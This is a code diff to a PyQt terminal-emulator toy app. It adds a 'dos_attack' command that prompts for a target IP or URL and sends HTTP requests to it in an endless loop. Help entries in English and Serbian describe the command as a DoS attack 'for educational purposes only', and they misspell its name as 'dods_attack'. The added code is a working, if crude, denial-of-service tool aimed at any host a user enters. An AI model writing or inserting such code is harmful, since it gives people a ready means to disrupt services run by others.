@@ -144,6 +144,11 @@ class TerminalScreen(QWidget):
 
     def print_info(self, text: str) -> None:
         self.print_line(text, color="lime", bold=False)
+    def dos_attack(self):
+        target, ok = QInputDialog.getText(self, "DDoS Attack", "Enter target IP or URL:")
+        while True:
+            r = requests.get(f"http://{target}")
+            self.print_info(f"Sent request to {target}, status code: {r.status_code}")
 
     def print_ascii_banner(self) -> None:
         banner = [
@@ -196,6 +201,7 @@ class TerminalScreen(QWidget):
             "cquit": self.cquit,        
             "hack": self.hack,           
             "hackfbi": self.hackfbi,     
+            "dos_attack": self.dos_attack
         }
 
         func = commands.get(cmd_lower)
@@ -241,6 +247,7 @@ class TerminalScreen(QWidget):
                 "cquit        - reset text color",
                 "hack         - simple matrix hack animation",
                 "search <text> - search on Google",
+                "dods_attack <target> - perform a simple DoS attack (for educational purposes only)",
                 "quit/exit    - exit program"
             ]
         else:
@@ -265,6 +272,7 @@ class TerminalScreen(QWidget):
                 "colora       - prikaži crveni tekst",
                 "cquit        - resetuj boju teksta",
                 "hack         - jednostavna matrica animacija",
+                "dods_attack <target> - izvrši jednostavan DoS napad (samo u edukativne svrhe)",
                 "quit/exit    - izlaz iz programa"
             ]
         self.print_info("=== Commands ===" if self.language == 0 else "=== Komande ===")
@@ -606,6 +614,7 @@ class TerminalScreen(QWidget):
                 ))
         except Exception as e:
             self.print_error(f"Internal error: {e}")
+
 
 
 
